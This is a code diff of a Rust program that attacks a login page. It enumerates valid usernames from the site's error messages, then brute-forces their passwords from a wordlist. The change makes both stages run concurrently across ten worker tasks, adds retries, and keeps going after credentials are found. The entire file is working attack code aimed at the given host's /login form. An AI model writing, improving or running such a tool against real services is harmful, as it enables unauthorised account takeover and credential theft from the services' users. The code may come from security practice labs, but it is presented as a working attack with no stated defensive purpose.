@@ -1,4 +1,5 @@
-use std::process::exit;
+use async_channel::bounded;
+use std::{process::exit, sync};
 
 #[tokio::main]
 async fn main() {
@@ -16,48 +17,113 @@ async fn main() {
         .lines()
         .collect::<Vec<_>>();
 
+    let valid_users = sync::Arc::new(tokio::sync::Mutex::new(Vec::new()));
+
+    let concurrency = 10;
+    let (user_tx, user_rx) = bounded(1);
     let url = format!("https://{}/login", host);
+
+    let mut handles = Vec::new();
     let client = reqwest::Client::new();
 
-    let mut valid_users = Vec::new();
+    for _ in 0..concurrency {
+        let valid_users = valid_users.clone();
+        let user_rx = user_rx.clone();
+        let url = url.clone();
+        let client = client.clone();
 
-    for &user in users_wordlist.iter() {
-        let params = [("username", user), ("password", "password")];
+        let handle = tokio::spawn(async move {
+            while let Ok(user) = user_rx.recv().await {
+                let params = [("username", user), ("password", "password")];
 
-        eprintln!("trying user: '{}'", user);
-        let result = client.post(&url).form(&params).send().await.unwrap();
+                eprintln!("trying user: '{}'", user);
+                let mut result = client.post(&url).form(&params).send().await;
 
-        if result.status() != 200 {
-            eprintln!("status: {}", result.status());
-            exit(1);
-        }
+                for _retry in 0..3 {
+                    if result.is_ok() {
+                        break;
+                    }
 
-        let body = result.text().await.unwrap();
+                    eprintln!("retrying...");
 
-        if !body.contains("Invalid username") {
-            println!("user found: {}", user);
-            valid_users.push(user);
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    result = client.post(&url).form(&params).send().await
+                }
+
+                let Ok(result) = result else {
+                    eprintln!("error: {}", result.unwrap_err());
+                    exit(1);
+                };
+
+                if result.status() != 200 {
+                    eprintln!("status: {}", result.status());
+                    exit(1);
+                }
+
+                let body = result.text().await.unwrap();
+
+                if !body.contains("Invalid username") {
+                    println!("user found: {}", user);
+                    let mut valid_users = valid_users.lock().await;
+                    valid_users.push(user);
+                }
+            }
+        });
+
+        handles.push(handle);
+    }
+
+    for user in users_wordlist {
+        user_tx.send(user).await.unwrap();
+    }
+
+    user_tx.close();
+
+    for handle in handles {
+        handle.await.unwrap();
+    }
+
+    // Brute force passwords
+
+    let (user_pass_tx, user_pass_rx) = bounded(1);
+
+    let handles = (0..concurrency)
+        .map(|_| {
+            let user_pass_rx = user_pass_rx.clone();
+            let url = url.clone();
+            let client = client.clone();
+
+            tokio::spawn(async move {
+                while let Ok((user, password)) = user_pass_rx.recv().await {
+                    let params = [("username", user), ("password", password)];
+
+                    eprintln!("trying user: '{}' and password: '{}'", user, password);
+                    let result = client.post(&url).form(&params).send().await.unwrap();
+
+                    if result.status() != 200 {
+                        eprintln!("status: {}", result.status());
+                        exit(1);
+                    }
+
+                    let body = result.text().await.unwrap();
+
+                    if !body.contains("Incorrect password") {
+                        println!("login credentials found: {}:{}", user, password);
+                    }
+                }
+            })
+        })
+        .collect::<Vec<_>>();
+
+    for &user in valid_users.lock().await.iter() {
+        for &password in passwords_wordlist.iter() {
+            user_pass_tx.send((user, password)).await.unwrap();
         }
     }
 
-    for &user in valid_users.iter() {
-        for &password in passwords_wordlist.iter() {
-            let params = [("username", user), ("password", password)];
+    user_pass_tx.close();
 
-            eprintln!("trying user: '{}' and password: '{}'", user, password);
-            let result = client.post(&url).form(&params).send().await.unwrap();
-
-            if result.status() != 200 {
-                eprintln!("status: {}", result.status());
-                exit(1);
-            }
-
-            let body = result.text().await.unwrap();
-
-            if !body.contains("Incorrect password") {
-                println!("login credentials found: {}:{}", user, password);
-                exit(0);
-            }
-        }
+    for handle in handles {
+        handle.await.unwrap();
     }
 }
